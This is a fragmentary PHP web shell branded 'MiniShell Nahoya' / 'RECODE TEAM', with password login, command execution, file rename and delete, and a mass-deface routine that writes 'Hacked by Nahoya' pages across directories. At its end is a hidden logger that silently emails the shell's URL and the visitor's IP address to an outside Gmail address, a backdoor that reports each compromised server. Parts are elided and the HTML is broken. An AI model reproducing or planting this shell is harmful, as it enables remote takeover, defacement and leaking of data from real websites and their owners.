...
if($_POST['password'] == $pass) {
  ...
  echo "<script>window.location='?RECODETEAM'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='#'>Back</a>";
  exit();
...
<html>
<head>
	<title>MiniShell Nahoya</title>
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<body bgcolor="black">
	<center><img src="https://d.top4top.io/p_2059mc6d10.png" style="opacity:0.5; width:650px; height:650px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">-=[ RECODE TEAM</font><font color="white" face="Patrick Hand"> Shell ]=-</font><br>
</center>
...
<HTML>
<HEAD>
<link rel="SHORTCUT ICON" href="https://d.top4top.io/p_2059mc6d10.png">
<DIV align=center><IMG src="https://d.top4top.io/p_2059mc6d10.png" width=650 height=650><br>
<audio autoplay> <source src="https://a.top4top.io/m_2618bm7ht2.mp3" type="audio/mpeg"></audio>
<center><font color="red" face="Papyrus"><font color="#47FF0F" face="Papyrus"></font></footer></tr></table>
</style>
<link href="https://fonts.googleapis.com/css?family=Walter+Turncoat" rel="stylesheet">
<title>Nahoya MiniShell</title>
...
body{
<body bgcolor="black">
background: url(https://d.top4top.io/p_2059mc6d10.png) no-repeat center center fixed; #fff;
...
if($_GET['do'] == 'cmd') {
	...
	</center>"; } else { echo "<center>Salin Usernamenya Suu<br>
...
if ($_GET['to'] == "mass") {
    ...
    <input cols='7' rows='7' type='text' style='color:lime;background-color:#191919;font-family:kelly slab' name='base_dir' value='" . getcwd() . "'><br><br>";
        ...
        echo "<font color='white'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#191919;font-family:kelly slab' name='index'>Hacked by Nahoya</textarea><br>";
...
echo '<font color="lime">Sukses ganti nama tod</font><br/>';
}else{
echo '<font color="red">Gagal ganti nama tod </font><br />';
}
...
echo '<font color="lime">Berhasil hapus file tod</font><br/>';
}else{
echo '<font color="red">Gagal hapus file tod</font><br/>';
}
}
}
echo '</center>';
...
echo '<font face="Kelly Slab" color="white" size="2px"><center><br/><b>Copyright &copy; 2021 <font color="lime">RECODE TEAM</a></center></font>
...
?> 
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'cspinostore@gmail.com'; $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); ?>